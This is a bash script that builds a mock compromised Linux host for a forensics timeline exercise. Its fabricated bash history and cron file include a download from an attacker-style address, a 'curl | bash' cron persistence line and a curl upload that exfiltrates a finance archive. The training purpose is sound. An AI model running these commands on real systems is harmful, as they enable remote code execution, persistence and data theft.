#!/usr/bin/env bash
# ===========================================================================
#  DF-14 "The Midnight Exfil" — host artifact tree builder
#  Meridian Finance / fin-srv-01 / compromised user: jsmith
#
#  Produces ./root_fs/  — a mini filesystem that log2timeline.py parses into
#  timeline.plaso (see generate_plaso.sh).
#
#  IMPORTANT: host logs represent SERVER LOCAL TIME (America/New_York, EST,
#  UTC-5). We build with TZ=UTC and write wall-clock values verbatim, so every
#  host event is STORED as 02:xx UTC. The VPN feed (external-events.jsonl) is
#  TRUE UTC at 07:xx. The +5h gap IS the normalization exercise. Do NOT pass a
#  --timezone to log2timeline or you will collapse the gap and kill the lesson.
# ===========================================================================
set -euo pipefail
export TZ=UTC                       # <-- critical: store wall-clock as UTC
OUT="${1:-./root_fs}"
D="2025-11-12"                      # incident date
DPREV="2025-11-11"                  # benign/noise day

rm -rf "$OUT"
mkdir -p "$OUT"/var/log \
         "$OUT"/home/jsmith/.ssh \
         "$OUT"/etc/cron.d \
         "$OUT"/tmp \
         "$OUT"/srv/finance/customer_accounts \
         "$OUT"/srv/finance/q4_reports

# helper: touch a file to a UTC wall-clock time
ts() { touch -d "$1" "$2"; }
# helper: bash history epoch for a host-local wall clock (stored as UTC)
ep() { date -u -d "$1" +%s; }

# ---------------------------------------------------------------------------
# 1) auth.log  (syslog, server local time — no TZ in the line, EST implied)
# ---------------------------------------------------------------------------
AUTH="$OUT/var/log/auth.log"
{
  # --- NOISE: benign business-hours logins on 2025-11-11 ---
  echo "Nov 11 09:02:14 fin-srv-01 sshd[2041]: Accepted password for jsmith from 192.168.0.31 port 49882 ssh2"
  echo "Nov 11 09:02:14 fin-srv-01 sshd[2041]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)"
  echo "Nov 11 11:18:47 fin-srv-01 sshd[3120]: Accepted publickey for mwong from 192.168.0.34 port 50410 ssh2"
  echo "Nov 11 14:55:03 fin-srv-01 sudo:   jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/apt update"
  echo "Nov 11 17:40:22 fin-srv-01 sshd[3120]: pam_unix(sshd:session): session closed for user mwong"

  # --- INCIDENT: SSH brute force from the VPN-assigned address 10.10.10.66 ---
  for i in $(seq 0 11); do
    mm=$((14 + i/4)); ss=$(printf "%02d" $(( (10 + i*7) % 60 )))
    pt=$((50100 + i*13))
    echo "Nov 12 02:$(printf %02d $mm):$ss fin-srv-01 sshd[12${i}45]: Failed password for jsmith from 10.10.10.66 port $pt ssh2"
  done
  # --- F1: successful login (Initial Access) ---
  echo "Nov 12 02:17:33 fin-srv-01 sshd[12990]: Accepted password for jsmith from 10.10.10.66 port 50233 ssh2"
  echo "Nov 12 02:17:33 fin-srv-01 sshd[12990]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)"
  echo "Nov 12 02:19:05 fin-srv-01 sudo:   jsmith : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/sudo -l"
} > "$AUTH"
ts "$D 02:35:00" "$AUTH"          # mtime helps Plaso infer the year (2025)

# ---------------------------------------------------------------------------
# 2) jsmith .bash_history  (epoch comment lines -> Plaso timestamps them)
#    epochs computed from host-local wall clock, stored as UTC (02:xx band)
# ---------------------------------------------------------------------------
BH="$OUT/home/jsmith/.bash_history"
{
  # NOISE: a couple of benign earlier commands
  echo "#$(ep "$DPREV 09:05:00")"; echo "ls -la"
  echo "#$(ep "$DPREV 09:06:12")"; echo "cd /srv/finance"
  # INCIDENT
  echo "#$(ep "$D 02:18:02")"; echo "whoami"
  echo "#$(ep "$D 02:18:09")"; echo "id"
  echo "#$(ep "$D 02:18:20")"; echo "uname -a"
  echo "#$(ep "$D 02:18:41")"; echo "cat /etc/passwd"
  echo "#$(ep "$D 02:19:05")"; echo "sudo -l"
  echo "#$(ep "$D 02:19:48")"; echo "cd /tmp"
  # F2: tool dropped (Execution)
  echo "#$(ep "$D 02:20:15")"; echo "wget http://198.51.100.66/lin_enum.sh"
  echo "#$(ep "$D 02:20:22")"; echo "chmod +x lin_enum.sh"
  echo "#$(ep "$D 02:20:25")"; echo "./lin_enum.sh"
  # F3: persistence (cron.d)
  echo "#$(ep "$D 02:23:40")"; echo "echo '*/10 * * * * root curl -s http://198.51.100.66/b | bash' > /etc/cron.d/apache-maintenance"
  # F4: lateral movement (outbound SSH to internal DB host)
  echo "#$(ep "$D 02:26:10")"; echo "ssh dbadmin@192.168.0.60"
  # F5: collection + exfiltration (tar + curl)
  echo "#$(ep "$D 02:30:55")"; echo "cd /srv/finance"
  echo "#$(ep "$D 02:31:10")"; echo "tar czf /tmp/fin_backup.tar.gz customer_accounts q4_reports"
  echo "#$(ep "$D 02:31:40")"; echo "curl -X POST -F file=@/tmp/fin_backup.tar.gz http://198.51.100.66:8080/upload"
} > "$BH"
ts "$D 02:32:00" "$BH"

# ---------------------------------------------------------------------------
# 3) Dropped tool /tmp/lin_enum.sh  (filestat MACB = F2 corroboration)
# ---------------------------------------------------------------------------
cat > "$OUT/tmp/lin_enum.sh" <<'EOF'
#!/bin/sh
# basic linux enumeration
id; uname -a; cat /etc/passwd; sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
EOF
chmod +x "$OUT/tmp/lin_enum.sh"
ts "$D 02:20:15" "$OUT/tmp/lin_enum.sh"

# ---------------------------------------------------------------------------
# 4) Persistence /etc/cron.d/apache-maintenance  (F3)  + benign cron noise
# ---------------------------------------------------------------------------
echo "*/10 * * * * root curl -s http://198.51.100.66/b | bash" > "$OUT/etc/cron.d/apache-maintenance"
ts "$D 02:23:45" "$OUT/etc/cron.d/apache-maintenance"
# NOISE: legitimate cron jobs
echo "09,39 *    * * *   root   [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean" > "$OUT/etc/cron.d/php-sessionclean"
ts "$DPREV 03:11:00" "$OUT/etc/cron.d/php-sessionclean"
echo "17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly" > "$OUT/etc/crontab"
ts "2025-08-01 00:00:00" "$OUT/etc/crontab"

# ---------------------------------------------------------------------------
# 5) Lateral movement evidence: known_hosts gains db-01 (F4)
# ---------------------------------------------------------------------------
echo "192.168.0.60 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8Kf2bExampleDbHostKeyMeridian0001" \
  > "$OUT/home/jsmith/.ssh/known_hosts"
ts "$D 02:26:12" "$OUT/home/jsmith/.ssh/known_hosts"

# ---------------------------------------------------------------------------
# 6) Exfil archive kept as evidence /tmp/fin_backup.tar.gz  (F5)
# ---------------------------------------------------------------------------
# benign finance data (the "stolen" material)
printf 'acct,holder,balance\n10042,Acme LLC,184320.55\n10088,Borealis Inc,902145.10\n' \
  > "$OUT/srv/finance/customer_accounts/accounts_2025Q4.csv"
printf 'Meridian Finance — Q4 internal report (CONFIDENTIAL)\nRevenue: ...\n' \
  > "$OUT/srv/finance/q4_reports/q4_summary.txt"
ts "$DPREV 16:20:00" "$OUT/srv/finance/customer_accounts/accounts_2025Q4.csv"
ts "$DPREV 16:25:00" "$OUT/srv/finance/q4_reports/q4_summary.txt"
( cd "$OUT/srv/finance" && tar czf "../../tmp/fin_backup.tar.gz" customer_accounts q4_reports )
ts "$D 02:31:18" "$OUT/tmp/fin_backup.tar.gz"

echo "Artifact tree built at: $OUT"
find "$OUT" -printf '%TY-%Tm-%Td %TH:%TM:%TS  %p\n' | sort
